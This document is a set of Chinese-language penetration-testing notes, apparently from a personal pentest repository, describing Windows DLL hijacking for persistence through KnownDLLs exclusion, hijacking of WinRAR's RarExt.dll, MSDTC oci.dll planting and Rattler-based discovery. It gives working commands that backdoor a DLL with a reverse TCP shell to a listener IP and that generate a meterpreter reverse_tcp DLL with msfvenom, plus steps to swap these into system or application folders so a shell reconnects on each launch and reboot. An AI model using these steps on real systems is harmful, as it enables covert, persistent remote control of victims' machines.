  #### 劫持1
	注册表
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls下添加 "lpk.dll"(若无，自己创建)
	ExcludeFromKnownDlls可使KnownDLLs失效
	需要重新启动电脑
	查找可劫持的DLL：
	1.启动程序
	2.使用Process Explorer查看该应用程序启动后加载的DLL。
	3.从已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
	4.编写第三步中获取到的DLL的劫持DLL。
	5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/467.png)

	Explorer.exe启动调用winrar文件夹的RarExt.dll
	Msf监听
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/468.png)

	复制dll文件到the-backdoor-factory文件夹中，加载恶意dll进原dll
	>python backdoor.py -f RarExt.dll -s reverse_shell_tcp_inline -P 12138 -H 192.168.0.107 指定为kali监听的IP和端口
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/469.png)

	生成好的dll在backdoored文件夹，传入靶机中，替换原dll文件，最好把原dll保存备份。
	每次打开windows资源管理器的时候，即可上线。重启可维持
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/470.png)
  #### 劫持2
	使用
	https://github.com/coca1ne/DLL_Hijacker
	https://github.com/git20150901/DLLHijack_Detecter
	查看要劫持的DLL的函数导出表，会直接生成cpp源码，重编译指向恶意代码
	DLLHijack_Detecter可查看程序加载的不在KnownDLLs中的DLL
  #### MSDTC服务劫持
	服务名称MSDTC,显示名称Distributed Transaction Coordinator
	对应进程msdtc.exe,位于%windir%system32
	C:\Windows\System32\wbem\
	服务启动搜索注册表位置计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
	#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=4444 -f dll -o /var/www/html/oci.dll
	Oci.dll放入c:\windows\system32\
	重启服务即可
	>taskkill /f /im msdtc.exe
  #### Rattler
	自动化查找可劫持的DLL
	https://github.com/sensepost/rattler
	使用
	>Rattler_x64.exe calc.exe 1
	会列出可被劫持的DLL
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/471.png)

	按程序读取DLL位置顺序，把恶意DLL放入程序同目录后，执行程序即可。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/472.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/473.png)